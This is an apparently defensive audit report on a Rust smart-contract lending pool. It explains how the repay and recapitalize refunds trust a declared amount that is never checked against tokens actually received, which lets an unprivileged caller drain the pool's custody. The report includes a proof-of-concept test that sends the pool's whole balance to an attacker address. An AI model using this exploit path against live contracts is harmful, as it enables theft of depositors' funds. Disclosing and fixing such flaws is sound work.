### Title
Pool `repay`/`recapitalize` refund an unmeasured "inbound" amount, draining custody without any transfer in - (File: contracts/pool/src/ops/repay.rs)

### Summary
The pool's `repay` and `recapitalize` legs compute a refund ("overpayment" / "excess") from the **declared** `action.amount`, not from a measured balance delta of tokens actually transferred in. The pool never pulls the tokens itself — it trusts that the caller (the controller in the intended flow) already transferred them. When a market carries zero debt, the entire declared amount resolves to overpayment, which `Cache::transfer_out` then pays out of the pool's real token custody to the caller. An unprivileged address can call the pool directly and declare a repay equal to the pool's whole balance, receiving the tokens for free.

This is the structural analog of the wasmtime zero-`memory_pages` bug: a limit at zero (here, `current_debt_ceil == 0` / shortfall == 0) removes the boundary the accounting assumed existed, and the guard (`require_reserves`) is never consulted on the refund path, so the contract reads/writes outside its "sandbox" — custody that no supplier's claim backs.

### Finding Description
In `contracts/pool/src/ops/repay.rs`, `accounting` resolves `amount` into `(burned, overpayment)` via `cache.resolve_repay(amount, position)`. With `position == 0` (the account/debt leg has no debt), `resolve_repay` takes the full-close branch: `net_repay = 0`, `overpayment = amount`. The `RepayRoundsToZeroShares` assert passes because it is `net_repay == 0 || burned > 0` [1](#0-0) . `apply` then calls `cache.transfer_out(payer, overpayment)` [2](#0-1) , and `transfer_out` performs a raw SAC transfer with no `require_reserves` check and no `debit_cash` [3](#0-2) .

The file's own comment states the trust assumption: "The controller transfers the repay amount into the pool before this call" [4](#0-3) . Nothing in the pool enforces or measures that inbound transfer — INV-ACCT-10 documents that "the pool trusts" caller-supplied inputs [5](#0-4) . The pool's own test suite pins the exploit end-to-end: `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` calls `client().repay(&payer, &t.ract(0, custody_before))` directly on the pool (bypassing the controller, so no tokens move in), asserts `actual_amount == 0` (no debt retired), and asserts the entire custody balance is transferred to `payer` with the book untouched [6](#0-5) . The sibling test `test_unfunded_recapitalize_is_bounded_by_custody_not_by_the_declared_amount` shows `recapitalize` has the identical gap: the refund is "derived from a declared inbound amount, not from the cash book," and only a claim exceeding the token balance reverts inside the SAC — a claim of exactly the custody balance succeeds [7](#0-6) .

Even if `payer.require_auth()` is enforced, the attacker simply calls with themselves as `payer`; the auth check authorizes the theft rather than preventing it.

### Impact Explanation
Direct theft of user funds. For every market, an attacker can call `pool.repay(payer=self, action={hub_asset, amount=pool_token_balance}, position={scaled_amount:0})`; with zero debt on that (nonexistent) position the whole amount is "overpayment" and is transferred from pool custody to the attacker. Repeating per market drains every pool. Because `cash` accounting is not debited, the books still show supplier claims fully backed while the tokens are gone — subsequent withdrawals revert on `require_reserves`, compounding the insolvency.

### Likelihood Explanation
Requires only an unprivileged call directly to the pool contract — no privileged role, no oracle manipulation, no special market state other than the trivially creatable `position = 0`. The only precondition is that the pool entrypoint is reachable by a non-controller caller, which the pool's own unit test demonstrates by invoking the client directly. Severity: **Critical**.

### Recommendation
Measure the inbound transfer instead of trusting the declared amount: snapshot the SAC balance of the pool before the leg and require `balance_after_inbound - balance_before >= amount` before computing `overpayment`, or have the pool perform the `token.transfer(payer → pool, amount)` itself inside `repay`/`recapitalize`. Alternatively, gate all pool mutators to the known controller address (`require_auth` of the stored controller), and route `overpayment`/`excess` refunds through `debit_cash` + `require_reserves` so refunds can never exceed recorded surplus.

### Proof of Concept
Mirroring `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` in `contracts/pool/tests/flows.rs:3590-3611`:

```rust
let token = token::Client::new(&t.env, &t.asset);
let attacker = Address::generate(&t.env);
let loot = token.balance(&t.pool);   // entire custody of the market

// No tokens are transferred in. The market has no debt for this position,
// so the full declared amount resolves to "overpayment" and is refunded
// out of real custody via transfer_out — skipping debit_cash/require_reserves.
let mutation = t.client()
    .repay(&attacker, &t.ract(0, loot))
    .get_unchecked(0);

assert_eq!(mutation.actual_amount, 0);            // no debt retired
assert_eq!(token.balance(&attacker), loot);       // attacker holds the pool's tokens
assert_eq!(token.balance(&t.pool), 0);            // custody drained, cash book unchanged
```

The same path works via `recapitalize(&hub_asset, &attacker, &loot)` when `backing_shortfall(cache) == 0` (any solvent market): the declared excess over the zero shortfall is refunded from custody, bounded only by the SAC balance itself [8](#0-7) .

### Citations

**File:** contracts/pool/src/ops/repay.rs (L1-3)
```rust
//! Repay leg: burn debt shares, credit cash, refund overpayment to the payer.
//!
//! The controller transfers the repay amount into the pool before this call.
```

**File:** contracts/pool/src/ops/repay.rs (L25-33)
```rust
pub(crate) fn apply(
    env: &Env,
    payer: &Address,
    action: &PoolAction,
) -> (PoolPositionMutation, MarketStateSnapshot) {
    let outcome = accounting(env, action);

    outcome.cache.transfer_out(payer, outcome.overpayment);
    (outcome.mutation, outcome.snapshot)
```

**File:** contracts/pool/src/ops/repay.rs (L44-52)
```rust
    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );
```

**File:** contracts/pool/src/cache/cash.rs (L46-53)
```rust
    pub(crate) fn transfer_out(&self, recipient: &Address, amount: i128) {
        require_nonneg_amount(&self.env, amount);
        if amount == 0 {
            return;
        }
        let tok = token::Client::new(&self.env, &self.params.asset_id);
        tok.transfer(&self.env.current_contract_address(), recipient, &amount);
    }
```

**File:** docs/reference/invariants.md (L200-210)
```markdown
<a id="inv-acct-10"></a>

### INV-ACCT-10 — Account books reconcile with pool totals

The pool stores market totals only. Every pool position call carries the
account's scaled position, and the pool trusts it: it has no per-account book to
check the value against. For each market, the sum of account supply shares
equals the pool's supplied shares minus its revenue shares, and the sum of
account debt shares equals the pool's borrowed shares.

The controller holds this by construction, not by a runtime assertion. It takes
```

**File:** contracts/pool/tests/flows.rs (L3485-3512)
```rust
/// Live custody bounds the payout, not the declared amount: claiming more than
/// the pool holds reverts inside the SAC. This caps an unmeasured owner call at
/// the pool's real holdings of that asset.
#[test]
fn test_unfunded_recapitalize_is_bounded_by_custody_not_by_the_declared_amount() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody = token.balance(&t.pool);
    let before = t.state_snapshot();

    let outcome = t
        .client()
        .try_recapitalize(&hub(&t.asset), &payer, &(custody + 1));

    assert!(
        outcome.is_err(),
        "over-claiming past custody must not succeed"
    );
    assert_eq!(
        token.balance(&t.pool),
        custody,
        "a reverted over-claim leaves custody intact"
    );
    assert_eq!(token.balance(&payer), 0);
    assert_eq!(t.state_snapshot().cash, before.cash);
}
```

**File:** contracts/pool/tests/flows.rs (L3578-3611)
```rust
/// The refund gap is not specific to `recapitalize`. Two pool legs refund an
/// excess derived from a declared inbound amount, not from the cash book:
/// `ops::recapitalize::apply` (the excess over the shortfall) and
/// `ops::repay::apply` (the excess over the debt). Neither refund debits `cash`
/// or passes `require_reserves`.
///
/// A repay against a market with no debt makes the entire declared amount an
/// overpayment: `current_debt_ceil` is zero, so `resolve_repay` takes the
/// full-close branch and `net_repay` is zero. The `RepayRoundsToZeroShares`
/// assert in `ops::repay::accounting` passes on its `net_repay == 0` disjunct,
/// and the whole amount is refunded out of real custody with the book untouched.
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```
